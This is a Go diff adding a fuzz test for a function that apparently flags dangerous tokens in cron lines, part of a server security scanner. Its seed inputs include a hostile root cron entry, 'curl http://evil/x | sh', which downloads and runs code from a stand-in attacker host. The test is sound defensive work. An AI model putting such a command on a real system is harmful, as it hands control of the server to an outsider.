@@ -135,6 +135,18 @@ func FuzzDecodeHexString(f *testing.F) {
 	})
 }
 
+func FuzzCronHasDangerTokens(f *testing.F) {
+	f.Add("0 16 * * * root /usr/sbin/cl-smart-advice update-advices-metadata")
+	f.Add("* * * * * root curl http://evil/x | sh")
+	f.Add("* * * * * root /tmp/x.sh")
+	f.Add("")
+	f.Add("\x00\x00\x00")
+	f.Add("@daily root /usr/sbin/cloudlinux-xray-continuous &> /dev/null")
+	f.Fuzz(func(t *testing.T, line string) {
+		_ = cronHasDangerTokens([]byte(line))
+	})
+}
+
 func FuzzParseDBFindingDetails(f *testing.F) {
 	f.Add("Database: alice_wp\nOption: siteurl")
 	f.Add("no match at all")
